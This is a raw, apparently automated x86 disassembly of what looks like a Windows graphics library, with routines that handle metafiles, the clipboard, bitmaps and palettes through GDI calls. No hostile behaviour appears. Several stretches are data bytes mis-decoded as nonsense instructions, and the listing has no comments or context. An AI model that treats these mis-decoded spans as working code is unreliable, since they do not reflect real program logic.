mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41b04c
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b04c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4284da
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
call sub_4255d0
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_4263c0
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4284f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4284d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_428500
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427ca0
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_425540
sub_428584
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4285bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi + 0x42 ] al
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7ffbd79 ] bh
lea eax [ ecx ]
add [ esi - 0x72ebffbf ] cl
inc ecx
add ah bl
push ebx
inc edx
add al cl
push ebx
inc edx
add [ eax + ecx * 4 + 0x540d0042 ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x86
inc edx
add [ eax + eax ] ah
add [ esp + ebp + 0x42 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ esi + eax * 4 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
xchg [ edx ] al
add [ eax ] al
shl [ eax ] 0x86
inc edx
add [ edi ] al
or eax 0x74694254
insd
popad
jo r-xdata
call sub_418700
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4250f8
test al al
je r-xdata
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4286ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4287e4
xor eax eax
pop edx
rcl [ ebp + 0x68 ] 0xca
xchg [ edx ] al
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286f9
mov eax [ rw-data ]
call sub_418b28
retn
sub al 0x42
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
xchg [ edx ] al
shr [ edx + eax * 2 ] 0x1
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425154
retn
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418ac4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4286f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0x4 ] eax
sub_428654
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418ac4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4286f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286f9
mov eax [ rw-data ]
call sub_418b28
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4286ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4287e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425154
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418700
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4250f8
test al al
je r-xdata
sub_428700
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418ac4
mov esi eax
xor ecx ecx
push ebp
push sub_428770
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
mov edx ebx
mov eax esi
call sub_418700
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4287e4
sub_42877c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424c18
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4287b8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_4287e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424cdc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4287e4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424f1c
xor edx edx
push ebp
push sub_428878
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425300
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425154
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_428884
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424f1c
xor eax eax
push ebp
push sub_428963
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429c8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_428700
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429d8c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425300
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425154
retn
sub_428974
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403128
sub_428994
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_428700
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4289f0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_4234dc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_428700
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_428700
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_428a3c
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425e0c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_428aeb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_428af8
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_428b44
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_428700
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425678
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_429192
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026cc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_428e9c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425558
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425678
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425678
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425678
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425678
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_429143
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_429132
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_429110
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425678
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_428af8
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425e0c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423dac
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424a30
call sub_423dac
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4255d0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429117
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4290e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425678
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026ec
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423dac
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424a30
call sub_423dac
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423dac
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424a30
call sub_423dac
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_4039a0
call sub_4039a0
jmp r-xdata
sub_429139
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_429148
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_40391c
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4291a8
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_42920c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_428700
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_429407
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425678
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4293bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
